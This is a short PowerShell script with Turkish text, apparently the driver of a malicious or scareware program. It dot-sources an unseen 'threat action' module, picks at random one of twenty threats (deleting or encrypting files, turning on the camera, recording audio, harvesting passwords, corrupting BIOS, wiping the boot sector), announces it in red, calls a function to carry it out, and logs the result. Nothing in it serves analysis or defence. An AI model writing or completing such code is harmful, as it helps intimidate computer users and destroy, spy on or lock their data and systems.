# ============================================================
# EN – TEHDİT KONUŞMASI + UYGULAMA
# ============================================================

. ./modul_tehdit_eylem.ps1

$tehditler = @(
    "Ekranını karartıyorum.",
    "Dosyalarını siliyorum.",
    "Kameranı açıyorum.",
    "Ses kaydı alıyorum.",
    "Tüm şifrelerini topluyorum.",
    "Ekran görüntüsü çekiyorum.",
    "Fareni ele geçiriyorum.",
    "Klavyeni bloke ediyorum.",
    "Sistem sesini patlatıyorum.",
    "Görev çubuğunu gizliyorum.",
    "Masaüstü arka planını değiştiriyorum.",
    "Tüm açık programları kapatıyorum.",
    "Diskini dolduruyorum.",
    "BIOS ayarlarını bozuyorum.",
    "Boot sektörünü temizliyorum.",
    "Sana virüs gönderiyorum.",
    "Ekranını ters çeviriyorum.",
    "Tüm dosyalarını şifreliyorum.",
    "VPN'ini çalıyorum.",
    "Monitörünü kapatıyorum."
)

try {
    $secili = $tehditler | Get-Random
    Write-Host "[EN] $secili" -ForegroundColor Red
    TehditUygula $secili

    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] Tehdit uygulandı: $secili"
} catch {
    Write-Host "[EN] Tehdit hatası: $_" -ForegroundColor Red
}